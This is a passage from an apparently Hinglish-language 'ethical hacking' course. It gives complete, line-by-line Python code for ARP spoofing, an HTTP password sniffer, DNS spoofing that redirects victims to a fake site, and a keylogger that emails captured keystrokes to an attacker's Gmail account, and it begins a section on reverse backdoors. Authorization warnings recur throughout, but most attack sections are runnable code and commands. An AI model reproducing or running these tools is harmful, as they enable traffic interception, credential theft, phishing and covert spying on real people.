(256 IPs: 10.0.2.0 to 10.0.2.255) # Broadcast frame banao broadcast =
scapy.Ether(dst="ff:ff:ff:ff:ff:ff") # Line 5: Ethernet frame with broadcast MAC
# ff:ff:ff:ff:ff:ff = broadcast address (sabko bhejo) # Combine karo
arp_request_broadcast = broadcast / arp_request # Line 7: / operator packets ko
combine karta hai # Result: Ethernet frame + ARP request # Bhejo aur response lo
answered_list = scapy.srp(arp_request_broadcast, timeout=1)[0] # Line 9: srp() =
send and receive packets # timeout=1 = 1 second wait karo response ke liye # [0]
= answered packets (jo reply aaye) ``` **Breakdown:** - **Scapy:** Packet
crafting library (Wireshark ka Python version) - **ARP():** ARP packet banata
hai - **Ether():** Ethernet frame banata hai - **srp():** Layer 2 packets
send/receive karta hai - **Expected Output:** List of devices jo reply karenge
### Hands-On Challenge: **Task:** 1. Scapy install karo: `pip3 install scapy` 2.
Apne network ka IP range note karo (ifconfig se) 3. Simple ARP request bhejo
(code aage aayega) 4. Wireshark mein ARP packets capture karke dekho **Ethical
Tip:** ‚ö†Ô∏è ARP scanning sirf apne network par karo. Company/public WiFi par
unauthorized scanning illegal hai. Apna home lab setup karo ya virtual machines
use karo. --- ## 4.2 Network Scanner Implementation **Source:** Pages 18-20
**Original:** ‚úì **Added:** Complete working code with explanations ### Hinglish
Explanation: **Kya hai yeh?** Ek tool jo network par saare connected devices
discover karta hai - unka IP aur MAC address dikhata hai. **Kyun zaroori hai?**
Penetration testing mein sabse pehle yeh pata karna hota hai ki network par
kaunse devices hain. Phir unpar specific attacks try karte hain. **Kab use
karna?** - Network reconnaissance - Device inventory - Rogue device detection
**Real-world Example:** Ek company apne network par unauthorized devices
dhundhna chahti hai. Network scanner run karke woh saare connected devices dekh
sakti hai aur unknown devices identify kar sakti hai. ### Complete Network
Scanner Code: ```python #!/usr/bin/env python3 import scapy.all as scapy import
argparse def get_arguments(): parser =
argparse.ArgumentParser(description="Network Scanner") parser.add_argument("-t",
"--target", required=True, help="Target IP / IP range (e.g., 10.0.2.1/24)") args
= parser.parse_args() return args def scan(ip): # Line 11: Main scanning
function arp_request = scapy.ARP(pdst=ip) # Line 12: ARP request packet banao #
pdst = packet destination (target IP/range) broadcast =
scapy.Ether(dst="ff:ff:ff:ff:ff:ff") # Line 13: Broadcast Ethernet frame # Sabko
bhejenge taaki sabse reply aaye arp_request_broadcast = broadcast / arp_request
# Line 14: Combine both packets # / operator Scapy mein layers ko stack karta
hai answered_list = scapy.srp(arp_request_broadcast, timeout=1,
verbose=False)[0] # Line 15: Packets bhejo aur responses lo # timeout=1: 1
second wait karo # verbose=False: Extra output mat dikhao # [0]: Sirf answered
packets chahiye (unanswered nahi) clients_list = [] # Line 16: Empty list to
store results for element in answered_list: # Line 17: Har response ko process
karo client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc} # Line 18:
Dictionary banao with IP and MAC # element[1] = response packet # psrc = packet
source (IP address) # hwsrc = hardware source (MAC address)
clients_list.append(client_dict) # Line 19: Dictionary ko list mein add karo
return clients_list # Line 20: Final list return karo def
print_result(results_list): # Line 22: Results ko formatted print karo
print("IP\t\t\tMAC Address") print("-----------------------------------------")
# Line 23-24: Header print karo # \t = tab space (alignment ke liye) for client
in results_list: # Line 25: Har client ko print karo print(client["ip"] + "\t\t"
+ client["mac"]) # Line 26: IP aur MAC print karo with formatting # Main
execution options = get_arguments() scan_result = scan(options.target)
print_result(scan_result) ``` **Breakdown:** - **scapy.ARP():** ARP request
packet create karta hai - **scapy.Ether():** Ethernet frame create karta hai -
**scapy.srp():** Send and Receive Packets (Layer 2) - **Dictionary:** `{"ip":
"10.0.2.5", "mac": "00:11:22:33:44:55"}` - **List of Dictionaries:** Multiple
clients store karne ke liye **Expected Output:** ```bash python3
network_scanner.py -t 10.0.2.1/24 # Output: IP MAC Address
----------------------------------------- 10.0.2.1 52:54:00:12:35:00 10.0.2.5
08:00:27:3f:4a:2b 10.0.2.7 08:00:27:5c:1d:9e ``` ### Hands-On Challenge:
**Task:** 1. Script ko apne network range ke saath run karo 2. Results ko file
mein save karne ka feature add karo 3. MAC address se vendor identify karo (OUI
lookup) 4. Specific IP range scan karne ka option add karo **Ethical Tip:** ‚ö†Ô∏è
Network scanning powerful tool hai. Sirf authorized networks par use karo.
Unauthorized scanning illegal hai aur network admins ko alert kar sakti hai.
Apna test lab banao. --- **[End of Part 2 - Modules 2-4 Complete]** **Next in
Part 3:** - Module 5: ARP Spoofing & MITM Attacks - Module 6: Packet Sniffing -
Module 7: DNS Spoofing --- ## Quick Reference - Modules 2-4 **Key Python
Concepts:** ```python input() # User input optparse/argparse # Command-line
arguments def function(): # Function definition if/elif/else # Conditionals
re.search(pattern, text) # Regex search subprocess.check_output() # Capture
command output ``` **Key Scapy Concepts:** ```python scapy.ARP(pdst="IP") # ARP
request scapy.Ether(dst="MAC") # Ethernet frame packet1 / packet2 # Combine
packets scapy.srp(packet) # Send/receive Layer 2 ``` **Ethical Reminders:** ‚úÖ
Input validation zaroori hai ‚úÖ Error handling add karo ‚úÖ Verification karo
(assume mat karo) ‚úÖ Sirf authorized networks scan karo ‚ùå Public WiFi par
scanning mat karo ‚ùå Bina permission company networks test mat karo
============================================================= # üîê Python &
Ethical Hacking - Part 3 ## Modules 5-7: ARP Spoofing, Packet Sniffing & MITM
Attacks --- # MODULE 5: ARP Spoofing & MITM Attacks **Difficulty:** Advanced
‚≠ê‚≠ê‚≠ê‚≠ê **Pages:** 23-24 **Prerequisites:** Module 4 (Network Scanner) ## What
You'll Learn: Man-in-the-Middle (MITM) attacks - network ke beech mein aake
traffic intercept karna. Yeh ek powerful technique hai jo real-world penetration
testing mein bahut use hoti hai. --- ## 5.1 ARP Spoofing Theory **Source:** Page
23 **Original:** ‚úì **Added:** Complete MITM attack flow diagram ### Hinglish
Explanation: **Kya hai yeh?** ARP Spoofing (ya ARP Poisoning) - victim ko fake
ARP responses bhejke uska traffic redirect karna. Tum beech mein aa jaate ho
victim aur router ke. **Kyun zaroori hai?** MITM attacks se tum victim ka saara
traffic dekh sakte ho - passwords, messages, browsing history sab kuch. Yeh
penetration testing ka core technique hai. **Kab use karna?** Authorized network
security testing mein jab tum network vulnerabilities check kar rahe ho.
**Real-world Example:** Ek company apne WiFi network ki security test karna
chahti hai. Pentester ARP spoofing use karke employees ke unencrypted traffic
capture karta hai aur report mein dikhata hai ki HTTPS use karna zaroori hai.
### Normal Network Flow (Without Attack): ``` Victim (10.0.2.7) ‚Üê‚Üí Router
(10.0.2.1) ‚Üê‚Üí Internet Victim ka ARP Table: 10.0.2.1 ‚Üí AA:BB:CC:DD:EE:FF (Router
ka real MAC) ``` ### MITM Attack Flow (With ARP Spoofing): ``` Attacker
(10.0.2.15) / \ / \ Victim (10.0.2.7) ‚Üê ‚Üí Router (10.0.2.1) Victim ka ARP Table
(Poisoned): 10.0.2.1 ‚Üí XX:XX:XX:XX:XX:XX (Attacker ka MAC - FAKE!) Router ka ARP
Table (Poisoned): 10.0.2.7 ‚Üí XX:XX:XX:XX:XX:XX (Attacker ka MAC - FAKE!) ```
**Attack Steps:** 1. **Attacker ‚Üí Victim:** "Main router hun (10.0.2.1), mera
MAC XX:XX:XX hai" 2. **Attacker ‚Üí Router:** "Main victim hun (10.0.2.7), mera
MAC XX:XX:XX hai" 3. **Result:** Dono ka traffic attacker ke through jaata hai
4. **Attacker:** Traffic dekh sakta hai, modify kar sakta hai, forward kar sakta
hai ### Why IP Forwarding is Critical: **Without IP Forwarding:** ``` Victim ‚Üí
Attacker (packets rukk jaati hain) ‚úó Router Result: Victim ka internet band ho
jaata hai (SUSPICIOUS!) ``` **With IP Forwarding:** ``` Victim ‚Üí Attacker ‚Üí
Router ‚Üí Internet Result: Victim ka internet normally kaam karta hai, but
attacker sab dekh raha hai ``` **Enable IP Forwarding:** ```bash echo 1 >
/proc/sys/net/ipv4/ip_forward # Enable cat /proc/sys/net/ipv4/ip_forward # Check
(should show 1) echo 0 > /proc/sys/net/ipv4/ip_forward # Disable (after attack)
``` ### Hands-On Challenge: **Task:** 1. Virtual machines setup karo (Kali + 2
victim VMs) 2. IP forwarding enable karo 3. ARP tables check karo: `arp -a` 4.
Wireshark mein ARP packets capture karo **Ethical Tip:** ‚ö†Ô∏è ARP spoofing BAHUT
POWERFUL hai. Yeh sirf authorized testing mein use karo. Bina permission kisi
network par MITM attack karna serious crime hai (IT Act Section 66). Jail ho
sakti hai. --- ## 5.2 ARP Spoofing Implementation **Source:** Page 23-24
**Original:** ‚úì **Added:** Complete code with restoration ### Line-by-Line Code
Example: ```python #!/usr/bin/env python3 import scapy.all as scapy import time
import sys def get_mac(ip): # Line 5: Function to get MAC address from IP
arp_request = scapy.ARP(pdst=ip) broadcast =
scapy.Ether(dst="ff:ff:ff:ff:ff:ff") arp_request_broadcast = broadcast /
arp_request answered_list = scapy.srp(arp_request_broadcast, timeout=1,
verbose=False)[0] # Lines 6-9: ARP request bhejke MAC address nikalo (already
explained) return answered_list[0][1].hwsrc # Line 10: MAC address return karo
def spoof(target_ip, spoof_ip): # Line 12: Main spoofing function # target_ip =
jisko fool karna hai # spoof_ip = jiski identity use karni hai target_mac =
get_mac(target_ip) # Line 13: Target ka MAC address nikalo packet =
scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) # Line 14: Fake
ARP response banao # op=2: ARP reply (op=1 hota hai request ke liye) # pdst:
Packet destination IP (target) # hwdst: Hardware destination MAC (target ka real
MAC) # psrc: Packet source IP (FAKE - router ka IP) # hwsrc: Automatically
attacker ka MAC use hoga scapy.send(packet, verbose=False) # Line 15: Packet
bhejo (victim ko) # verbose=False: Output screen par mat dikhao def
restore(destination_ip, source_ip): # Line 17: Attack ke baad normal ARP table
restore karo destination_mac = get_mac(destination_ip) source_mac =
get_mac(source_ip) # Lines 18-19: Dono ke real MAC addresses nikalo packet =
scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip,
hwsrc=source_mac) # Lines 20-21: Real ARP response banao (correct MAC ke saath)
scapy.send(packet, count=4, verbose=False) # Line 22: 4 baar bhejo (ensure karne
ke liye update ho jaaye) # Main execution target_ip = "10.0.2.7" # Victim ka IP
gateway_ip = "10.0.2.1" # Router ka IP try: sent_packets_count = 0 while True: #
Line 28: Infinite loop (continuous spoofing) spoof(target_ip, gateway_ip) # Line
29: Victim ko batao "Main router hun" spoof(gateway_ip, target_ip) # Line 30:
Router ko batao "Main victim hun" sent_packets_count += 2 print(f"\r[+] Packets
sent: {sent_packets_count}", end="") # Line 31-32: Counter update karo (same
line par) # \r = carriage return (line ke start par wapas jao) # end="" =
newline mat do time.sleep(2) # Line 33: 2 seconds wait karo (continuous spam se
bachne ke liye) except KeyboardInterrupt: # Line 34: Ctrl+C press karne par
print("\n[+] Detected CTRL+C ... Restoring ARP tables") restore(target_ip,
gateway_ip) restore(gateway_ip, target_ip) # Lines 35-37: Dono ARP tables
restore karo print("[+] ARP tables restored. Exiting...") sys.exit() ```
**Breakdown:** - **get_mac():** IP se MAC nikalta hai (network scanner jaisa) -
**spoof():** Fake ARP reply bhejta hai - **restore():** Attack ke baad original
ARP table restore karta hai - **op=2:** ARP reply packet (gratuitous ARP) -
**Continuous loop:** ARP cache timeout hota hai, isliye baar-baar bhejte hain
**Expected Output:** ```bash sudo python3 arp_spoof.py # Output: [+] Packets
sent: 2 [+] Packets sent: 4 [+] Packets sent: 6 ... ^C [+] Detected CTRL+C ...
Restoring ARP tables [+] ARP tables restored. Exiting... ``` **Verification:**
```bash # Victim machine par check karo: arp -a # Router ka MAC attacker ka MAC
dikhega (poisoned!) ``` ### Hands-On Challenge: **Task:** 1. 3 VMs setup karo
(Attacker, Victim, Router) 2. IP forwarding enable karo attacker par 3. Script
run karo 4. Victim par `arp -a` check karo (poisoned table dekho) 5. Wireshark
mein traffic capture karo **Ethical Tip:** ‚ö†Ô∏è Yeh attack BAHUT dangerous hai.
Victim ka saara traffic tumhare through jaata hai. Sirf authorized testing mein
use karo. Real-world mein isse banking fraud, identity theft ho sakta hai. NEVER
use on unauthorized networks. --- # MODULE 6: Packet Sniffing **Difficulty:**
Advanced ‚≠ê‚≠ê‚≠ê‚≠ê **Pages:** 25-26 **Prerequisites:** Module 5 (ARP Spoofing) ##
What You'll Learn: Network traffic capture karna aur usme se sensitive
information (passwords, cookies) extract karna. Yeh MITM attack ka next step
hai. --- ## 6.1 HTTP Packet Sniffing **Source:** Page 25 **Original:** ‚úì
**Added:** HTTPS vs HTTP explanation ### Hinglish Explanation: **Kya hai yeh?**
Packet Sniffing - network traffic ko capture karke analyze karna. Hum HTTP
requests mein se URLs aur login credentials extract karenge. **Kyun zaroori
hai?** MITM attack ke baad traffic capture karna zaroori hai. Isse pata chalta
hai ki victim kya kar raha hai - kaunsi websites visit kar raha hai, kya data
bhej raha hai. **Kab use karna?** Authorized penetration testing mein jab tum
network security assess kar rahe ho. **Real-world Example:** Ek company test
karna chahti hai ki employees sensitive data HTTP par bhej rahe hain ya HTTPS
par. Packet sniffer se pata chal jaata hai ki kaunse applications insecure hain.
### HTTP vs HTTPS: | Feature | HTTP | HTTPS | |---------|------|-------| |
**Encryption** | ‚ùå Plain text | ‚úÖ Encrypted (TLS/SSL) | | **Sniffable?** | ‚úÖ
Yes | ‚ùå No (gibberish dikhega) | | **Port** | 80 | 443 | | **Security** |
Insecure | Secure | | **Example** | http://example.com | https://example.com |
**HTTP Packet (Sniffable):** ``` POST /login.php HTTP/1.1 Host: example.com
Content-Type: application/x-www-form-urlencoded
username=admin&password=secret123 ``` Attacker yeh sab dekh sakta hai! ‚ò†Ô∏è
**HTTPS Packet (Encrypted):** ``` 17 03 03 00 4a 8f 2c 9d ... (encrypted
gibberish) ``` Attacker ko kuch samajh nahi aayega ‚úÖ ### Line-by-Line Code
Example: ```python #!/usr/bin/env python3 import scapy.all as scapy from
scapy.layers import http def sniff(interface): # Line 4: Sniffing function
scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet) # Line 5:
Packets capture karo # iface: Interface naam (eth0, wlan0) # store=False: Memory
mein store mat karo (RAM bachane ke liye) # prn: Callback function (har packet
ke liye call hoga) def get_url(packet): # Line 7: URL extract karo packet se
return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path # Line 8:
Host + Path = Complete URL # Example: "example.com" + "/login.php" =
"example.com/login.php" def get_login_info(packet): # Line 10: Login credentials
extract karo if packet.haslayer(scapy.Raw): # Line 11: Check karo packet mein
Raw data hai ya nahi # Raw layer = actual data (POST body) load =
packet[scapy.Raw].load # Line 12: Raw data nikalo keywords = ["username",
"user", "login", "password", "pass"] # Line 13: Keywords list (common field
names) for keyword in keywords: # Line 14: Har keyword check karo if keyword in
str(load): # Line 15: Agar keyword mila return load # Line 16: Pura data return
karo def process_sniffed_packet(packet): # Line 18: Har captured packet ko
process karo if packet.haslayer(http.HTTPRequest): # Line 19: Check karo HTTP
request hai ya nahi url = get_url(packet) print(f"[+] HTTP Request >> {url}") #
Lines 20-21: URL print karo login_info = get_login_info(packet) if login_info: #
Lines 22-23: Agar credentials mile print(f"\n[+] Possible username/password >>
{login_info}\n") # Main execution sniff("eth0") # Apna interface naam dalo ```
**Breakdown:** - **scapy.sniff():** Continuous packet capture - **prn
parameter:** Callback function (har packet ke liye) - **http.HTTPRequest:** HTTP
request layer - **scapy.Raw:** Actual data layer (POST body) - **Keywords
matching:** Common field names dhundhte hain **Expected Output:** ```bash sudo
python3 packet_sniffer.py # Output: [+] HTTP Request >> example.com/ [+] HTTP
Request >> example.com/login.php [+] Possible username/password >>
b'username=admin&password=secret123' [+] HTTP Request >> facebook.com/home.php
``` **Testing:** ```bash # Victim machine par HTTP site kholo: curl -X POST
http://testphp.vulnweb.com/login.php \ -d "username=test&password=test123" #
Attacker machine par credentials capture honge! ``` ### Hands-On Challenge:
**Task:** 1. ARP spoofing chalu karo (Module 5) 2. Packet sniffer run karo 3.
Victim machine se HTTP login karo (http://testphp.vulnweb.com) 4. Attacker
machine par credentials dekho 5. HTTPS site try karo - kuch capture nahi hoga
**Ethical Tip:** ‚ö†Ô∏è Packet sniffing se passwords, credit cards, personal
messages sab capture ho sakte hain. Yeh EXTREMELY sensitive technique hai. Sirf
authorized testing mein use karo. Real-world mein isse identity theft, financial
fraud ho sakta hai. --- ## 6.2 Extracting Passwords from Forms **Source:** Page
26 **Original:** ‚úì **Added:** Enhanced filtering ### Hinglish Explanation: **Kya
hai yeh?** Previous code mein har HTTP request print ho raha tha. Ab hum sirf
woh requests print karenge jisme credentials hain. **Kyun zaroori hai?** Bahut
saara traffic hota hai network mein. Sirf relevant data dekhna chahiye, warna
information overload ho jaayega. **Kab use karna?** Jab tum specific data dhundh
rahe ho (passwords, API keys, tokens). **Real-world Example:** Ek pentester
company ke network par 1000+ HTTP requests dekh raha hai. Filtering se sirf 5
requests milti hain jisme passwords hain - yeh report mein jaayengi. ###
Enhanced Code: ```python #!/usr/bin/env python3 import scapy.all as scapy from
scapy.layers import http def sniff(interface): scapy.sniff(iface=interface,
store=False, prn=process_sniffed_packet) def get_url(packet): return
packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path def
get_login_info(packet): if packet.haslayer(scapy.Raw): load =
packet[scapy.Raw].load keywords = ["username", "user", "login", "password",
"pass", "email"] for keyword in keywords: if keyword in str(load): return load #
Agar ek bhi keyword mila, return kar do def process_sniffed_packet(packet): if
packet.haslayer(http.HTTPRequest): url = get_url(packet) print(f"[+] HTTP
Request >> {url}") login_info = get_login_info(packet) if login_info: # Sirf tab
print karo jab credentials mile print(f"\n\n[+] Possible username/password >>
{login_info}\n\n") sniff("eth0") ``` **Key Improvement:** - **Filtering:** Sirf
woh packets print hote hain jisme keywords hain - **Keywords list:** Expand kar
sakte ho (email, token, api_key, etc.) - **Cleaner output:** Unnecessary
requests nahi dikhte **Expected Output:** ```bash sudo python3 packet_sniffer.py
# Output (filtered): [+] HTTP Request >> example.com/login.php [+] Possible
username/password >>
b'username=admin&password=secret123&email=admin@example.com' [+] HTTP Request >>
api.example.com/auth [+] Possible username/password >>
b'api_key=abc123xyz&user=testuser' ``` ### Hands-On Challenge: **Task:** 1.
Keywords list mein "token", "api_key" add karo 2. Different HTTP sites test karo
3. Output ko file mein save karo: `python3 sniffer.py > captured.txt` 4. Regex
use karke sirf passwords extract karo **Ethical Tip:** ‚ö†Ô∏è Captured credentials
ko secure storage mein rakho. Report mein passwords ko mask karo (admin:***).
Client ko immediately inform karo ki unencrypted data mil gaya. Yeh serious
vulnerability hai. --- # MODULE 7: DNS Spoofing (MISSING TOPIC - ADDED)
**Difficulty:** Advanced ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê **Pages:** NEW (36-42) **Prerequisites:**
Module 5 (ARP Spoofing) ## What You'll Learn: DNS requests ko intercept karke
fake responses bhejni seekhoge. Victim ko fake websites par redirect kar sakte
ho. Yeh phishing attacks ka core technique hai. --- ## 7.1 DNS Spoofing Theory
**Source:** NEW - Missing from original notes **Added:** Complete DNS spoofing
explanation ### Hinglish Explanation: **Kya hai yeh?** DNS Spoofing - DNS
requests ko intercept karke fake IP addresses return karna. Victim jab
google.com type kare, toh tumhara fake site khul jaaye. **Kyun zaroori hai?**
Phishing attacks, credential harvesting, malware distribution - sab DNS spoofing
se possible hai. Yeh MITM attack ka advanced version hai. **Kab use karna?**
Authorized penetration testing mein jab tum phishing awareness test kar rahe ho.
**Real-world Example:** Ek company apne employees ko phishing awareness training
dena chahti hai. Pentester DNS spoofing use karke fake login page dikhata hai.
Jo employees credentials enter karte hain, unhe training di jaati hai. ###
Normal DNS Flow: ``` User types: google.com ‚Üì Browser ‚Üí DNS Server: "What is IP
of google.com?" ‚Üì DNS Server ‚Üí Browser: "172.217.160.46" ‚Üì Browser connects to
172.217.160.46 (Real Google) ``` ### DNS Spoofing Attack: ``` User types:
google.com ‚Üì Browser ‚Üí Attacker (intercepts): "What is IP of google.com?" ‚Üì
Attacker ‚Üí Browser: "10.0.2.15" (FAKE IP - Attacker's server) ‚Üì Browser connects
to 10.0.2.15 (Fake Google - Phishing site!) ``` **Attack Requirements:** 1.
**ARP Spoofing:** Traffic attacker ke through jaana chahiye 2.
**NetfilterQueue:** DNS packets ko intercept karna 3. **Fake Website:** Phishing
page host karna ### Line-by-Line Code Example: ```python #!/usr/bin/env python3
import netfilterqueue import scapy.all as scapy def process_packet(packet): #
Line 4: Har intercepted packet ko process karo scapy_packet =
scapy.IP(packet.get_payload()) # Line 5: Packet ko Scapy format mein convert
karo # get_payload() = raw packet data if scapy_packet.haslayer(scapy.DNSQR): #
Line 6: Check karo DNS query hai ya nahi # DNSQR = DNS Question Record qname =
scapy_packet[scapy.DNSQR].qname # Line 7: Query name nikalo (kaunsi website?) if
b"www.example.com" in qname: # Line 8: Agar target website hai print(f"[+]
Spoofing DNS for: {qname}") answer = scapy.DNSRR(rrname=qname,
rdata="10.0.2.15") # Line 10: Fake DNS response banao # DNSRR = DNS Resource
Record (answer) # rrname = query name (same as request) # rdata = response data
(FAKE IP - attacker ka server) scapy_packet[scapy.DNS].an = answer
scapy_packet[scapy.DNS].ancount = 1 # Lines 11-12: Answer add karo packet mein #
an = answer section # ancount = number of answers (1) del
scapy_packet[scapy.IP].len del scapy_packet[scapy.IP].chksum del
scapy_packet[scapy.UDP].len del scapy_packet[scapy.UDP].chksum # Lines 13-16:
Checksums delete karo # Scapy automatically recalculate karega
packet.set_payload(bytes(scapy_packet)) # Line 17: Modified packet wapas set
karo packet.accept() # Line 18: Packet ko forward karo (modified ya original) #
Setup NetfilterQueue queue = netfilterqueue.NetfilterQueue() queue.bind(0,
process_packet) # Lines 20-21: Queue setup karo # 0 = queue number #
process_packet = callback function try: queue.run() except KeyboardInterrupt:
print("\n[+] Stopping DNS spoofer...") ``` **Terminal Setup:** ```bash # Step 1:
IP forwarding enable karo echo 1 > /proc/sys/net/ipv4/ip_forward # Step 2: DNS
traffic ko queue mein redirect karo iptables -I FORWARD -j NFQUEUE --queue-num 0
# Step 3: Script run karo sudo python3 dns_spoof.py # Step 4: Cleanup (Ctrl+C ke
baad) iptables --flush ``` **Expected Output:** ```bash sudo python3
dns_spoof.py # Output: [+] Spoofing DNS for: b'www.example.com.' [+] Spoofing
DNS for: b'www.example.com.' ... ``` **Victim Side:** ```bash # Victim browser
mein: http://www.example.com # Opens attacker's fake site at 10.0.2.15! ``` ###
Hands-On Challenge: **Task:** 1. NetfilterQueue install karo: `pip3 install
netfilterqueue` 2. Apache server setup karo fake site ke liye 3. ARP spoofing +
DNS spoofing dono chalu karo 4. Victim machine se target site kholo 5. Fake site
dikhega! **Ethical Tip:** ‚ö†Ô∏è DNS spoofing EXTREMELY DANGEROUS hai. Isse banking
sites, email logins sab fake kar sakte ho. Yeh phishing ka main technique hai.
NEVER use without written authorization. Jail + heavy fine ho sakti hai. ---
**[End of Part 3 - Modules 5-7 Complete]** **Next in Part 4:** - Module 8:
Keyloggers (Complete Implementation) - Module 9: Backdoors & Reverse Shells -
Module 10: File Download/Upload --- ## Quick Reference - Modules 5-7 **Key
Commands:** ```bash # IP Forwarding echo 1 > /proc/sys/net/ipv4/ip_forward # ARP
Table arp -a # NetfilterQueue iptables -I FORWARD -j NFQUEUE --queue-num 0
iptables --flush ``` **Key Concepts:** ```python # ARP Spoofing scapy.ARP(op=2,
pdst=target, psrc=fake_ip) # Packet Sniffing scapy.sniff(iface="eth0",
prn=callback) # DNS Spoofing scapy.DNSRR(rrname=query, rdata=fake_ip) ```
**Ethical Reminders:** ‚úÖ Sirf authorized testing ‚úÖ Written permission zaroori
‚úÖ Restore ARP tables after attack ‚úÖ Report vulnerabilities responsibly ‚ùå
Public WiFi par NEVER test karo ‚ùå Banking/financial sites target mat karo
============================================================= # üîê Python &
Ethical Hacking - Part 4 ## Modules 8-10: Keyloggers, Backdoors & Persistence
--- # MODULE 8: Keyloggers (Complete Implementation) **Difficulty:** Advanced
‚≠ê‚≠ê‚≠ê‚≠ê **Pages:** 38-50 **Prerequisites:** Module 2 (OOP Concepts) ## What
You'll Learn: Keylogger banani seekhoge jo har key press record kare aur email
ke through report bheje. Yeh spyware ka core component hai. --- ## 8.1 Basic
Keylogger with pynput **Source:** Pages 38-39 **Original:** ‚úì **Added:**
Complete OOP implementation ### Hinglish Explanation: **Kya hai yeh?** Keylogger
- ek program jo keyboard par pressed keys record karta hai. Yeh silently
background mein chalta hai. **Kyun zaroori hai?** Penetration testing mein yeh
check karne ke liye ki kya sensitive data (passwords, credit cards) keyboard se
leak ho sakta hai. Antivirus testing ke liye bhi use hota hai. **Kab use
karna?** Authorized security testing mein jab tum data leakage vulnerabilities
check kar rahe ho. **Real-world Example:** Ek company test karna chahti hai ki
agar employee ka laptop compromise ho jaaye, toh kya data leak ho sakta hai.
Keylogger se pata chalta hai ki passwords, emails sab capture ho sakte hain. ###
Line-by-Line Code Example: ```python #!/usr/bin/env python3 import
pynput.keyboard import threading import smtplib class Keylogger: # Line 5: Class
definition (OOP approach) def __init__(self, time_interval, email, password): #
Line 7: Constructor - object create hone par call hota hai # time_interval:
Kitne seconds baad email bhejni hai # email: Attacker ka email # password: Email
password (App Password use karo - 2025 update) self.log = "Keylogger Started\n"
# Line 8: Empty log string (yahan keys store hongi) self.interval =
time_interval self.email = email self.password = password # Lines 9-11: Instance
variables (har object ka apna hoga) def append_to_log(self, string): # Line 13:
Log mein text add karne ka function self.log = self.log + string # Line 14:
Existing log ke end mein naya text add karo def process_key_press(self, key): #
Line 16: Har key press par yeh function call hoga try: # Line 17: Try block -
normal keys ke liye (a, b, 1, 2) current_key = str(key.char) # Line 18: Key ko
string mein convert karo # key.char = actual character (a, b, c, 1, 2)
self.append_to_log(current_key) # Line 19: Log mein add karo except
AttributeError: # Line 20: Special keys ke liye (Space, Enter, Ctrl) #
AttributeError tab aata hai jab key.char nahi hota if key ==
pynput.keyboard.Key.space: # Line 21: Agar Space key hai self.append_to_log(" ")
elif key == pynput.keyboard.Key.enter: # Line 23: Agar Enter key hai
self.append_to_log("\n") else: # Line 25: Baaki special keys (Ctrl, Alt, etc.)
self.append_to_log(f" [{key}] ") def send_mail(self, email, password, message):
# Line 28: Email bhejne ka function server = smtplib.SMTP("smtp.gmail.com", 587)
# Line 29: Gmail SMTP server se connect karo # 587 = TLS port server.starttls()
# Line 30: Encryption enable karo (security ke liye) server.login(email,
password) # Line 31: Email account mein login karo server.sendmail(email, email,
message) # Line 32: Email bhejo (from, to, message) server.quit() # Line 33:
Connection close karo def report(self): # Line 35: Report function (threading ke
saath) if self.log: # Line 36: Agar log empty nahi hai
self.send_mail(self.email, self.password, f"\n--- Keylogger Report
---\n{self.log}") # Lines 37-38: Email bhejo with log self.log = "" # Line 39:
Log ko empty karo (next report ke liye) timer = threading.Timer(self.interval,
self.report) # Line 40: Timer set karo (interval ke baad report() call hoga)
timer.start() # Line 41: Timer start karo def start(self): # Line 43: Keylogger
start karne ka function keyboard_listener = pynput.keyboard.Listener(
on_press=self.process_key_press) # Lines 44-45: Keyboard listener create karo #
on_press: Callback function (har key press par call hoga) with
keyboard_listener: # Line 46: Listener ko context manager ke saath use karo
self.report() # Line 47: Report function start karo (threading mein)
keyboard_listener.join() # Line 48: Main thread ko block karo (program running
rahega) # Usage my_keylogger = Keylogger(120, "attacker@gmail.com",
"app_password_here") my_keylogger.start() ``` **Breakdown:** - **OOP Approach:**
Code organized aur reusable hai - **Threading:** Report function background mein
chalta hai - **Exception Handling:** Normal aur special keys dono handle hote
hain - **SMTP:** Gmail ke through email bhejta hai **Expected Output (Email):**
``` --- Keylogger Report --- Keylogger Started admin password123 [Key.enter]
gmail.com [Key.tab] mypassword ``` **2025 Gmail Update:** ```python # Gmail App
Password kaise banaye: # 1. Google Account ‚Üí Security # 2. 2-Step Verification
enable karo # 3. App Passwords ‚Üí Generate # 4. "Mail" select karo ‚Üí Generate #
5. 16-digit password milega (yeh use karo) ``` ### Hands-On Challenge: **Task:**
1. pynput install karo: `pip3 install pynput` 2. Gmail App Password generate
karo 3. Script run karo aur kuch type karo 4. 2 minutes baad email check karo 5.
Log file mein bhi save karne ka feature add karo **Ethical Tip:** ‚ö†Ô∏è Keyloggers
EXTREMELY DANGEROUS hain. Yeh passwords, credit cards, personal messages sab
capture kar sakte hain. Sirf authorized testing mein use karo. Unauthorized
keylogger install karna serious crime hai (IT Act Section 66). --- # MODULE 9:
Reverse Backdoors **Difficulty:** Advanced ‚≠ê‚≠ê‚≠ê‚≠ê‚≠ê **Pages:** 51-93
**Prerequisites:** Modules 2, 8 (Functions, OOP) ## What You'll Learn: Reverse
backdoor banani seekhoge jo attacker ko victim machine ka complete control de.
File upload/download, command execution, screenshot capture - sab kuch. --- ##
9.1 Understanding Backdoors **Source:** Pages 51-52 **Original:** ‚úì **Added:**
Bind vs Reverse comparison ### Hinglish Explanation: **Kya hai yeh?** Backdoor -
ek program jo attacker ko victim machine ka remote access deta hai. Reverse
backdoor mein victim attacker se connect karta hai (firewall bypass). **Kyun
zaroori hai?** Post-exploitation phase mein persistent access maintain karne ke
liye. Ek baar access mil gaya, toh backdoor se wapas aa sakte ho. **Kab use
karna?** Authorized penetration testing mein jab tum persistence aur
post-exploitation test kar rahe ho. **Real-world Example:** Ek pentester
phishing email se victim machine compromise karta hai. Backdoor install karke
woh baad mein bhi access kar sakta hai, even if vulnerability patch ho jaaye.
### Bind vs Reverse Connection: **Bind Backdoor (Old Method):** ``` Attacker ‚Üí
Victim (listening on port 4444) Problem: Firewall blocks incoming connections ‚ùå
``` **Reverse Backdoor (Modern Method):** ``` Victim ‚Üí Attacker (listening on
port 4444) Benefit: Firewall allows outgoing connections ‚úÖ ``` **Why Reverse is
